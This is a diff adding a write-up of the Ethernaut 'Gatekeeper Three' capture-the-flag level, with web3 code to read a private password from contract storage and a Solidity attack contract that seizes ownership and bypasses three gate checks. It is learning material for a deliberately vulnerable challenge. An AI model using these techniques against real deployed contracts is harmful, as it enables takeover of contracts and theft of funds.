@@ -1,0 +1,114 @@
+---
+title: Level 28 - Gatekeeper Three
+slug: level-28
+published: 06-06-2023
+lastEdited:
+imgSrc: /images/ethernaut/ethernaut28.svg
+---
+
+## Objectives
+
+1. Become an entrant.
+
+## Vulnerabilities
+
+N/A, It's a technical skill test.
+
+## Exploit
+
+1. Create a `SimpleTrick` instance by calling `createTrick`.
+
+2. Copy the `SimpleTrick` instance address from the function `trick`.
+
+3. From there, you can read the value in storage slot 2 of the address copied from the previous setps
+   . This value is the `password` variable. You can use the web3 library for this directly in the console just like
+   the following :
+
+```javascript
+const hexPassword = await web3.eth.getStorageAt(
+  "0xCc6a4fE3cD105577D31c08C6792bfb7bCB8800c9",
+  2
+);
+const uintPassword = await web3.utils.hexToNumber(hexPassword);
+```
+
+4. Call `getAllowance` with `uintPassword` of the prvious step as argument. This will change `allowEntrance` to `true`.
+
+5. Write and deployt the following hack contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./GatekeeperThree.sol";
+
+contract GatekeeperThreeHack {
+    GatekeeperThree target;
+
+    constructor(address payable _targetAddress) {
+        target = GatekeeperThree(_targetAddress);
+    }
+
+    function enterHack() external payable {
+        target.construct0r();
+        (bool success, ) = payable(target).call{value: 0.002 ether}("");
+        require(success, "call failed");
+        target.enter();
+    }
+
+    receive () external payable {
+        revert();
+    }
+}
+```
+
+6. Call `enterHack` from your deployed hack contract. This function does three things.
+
+first it calls `construct0r` which makes the hack contract's address the `owner`.
+
+Then it sends 0.002 Eth to the GateKeeperThree address to make it's balance greater than 0.001 Eth.
+
+Lastly, it calls `enter`. At this point we pass the three `require` functions.
+
+### Let's explain how each gates work
+
+```solidity
+modifier gateOne() {
+    require(msg.sender == owner);
+    require(tx.origin != owner);
+    _;
+}
+```
+
+`msg.sender` is the _hack contract_'s address which is the `owner`. `tx.origin` is the EOA that we use to initiate the
+transaction. They are not the same.
+
+```solidity
+modifier gateTwo() {
+    require(allowEntrance == true);
+    _;
+}
+```
+
+`allowEntrance` is set to true at step 4.
+
+```solidity
+modifier gateThree() {
+    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
+        _;
+    }
+}
+```
+
+`address(this).balance` is greater than 0.001 Eth since our hack contract sent 0.002 Eth in `enterHack`.
+
+`payable(owner).send(0.001 ether)` is false since we have created the `receive` of our hack contract to revert
+any transaction.
+
+## Suggested mitigation
+
+N/A, It's a technical skill test.
+
+## Further reading
+
+- SWC-136 - Unencrypted private data on-chain <ExternalLink href={"https://swcregistry.io/docs/SWC-136"} />
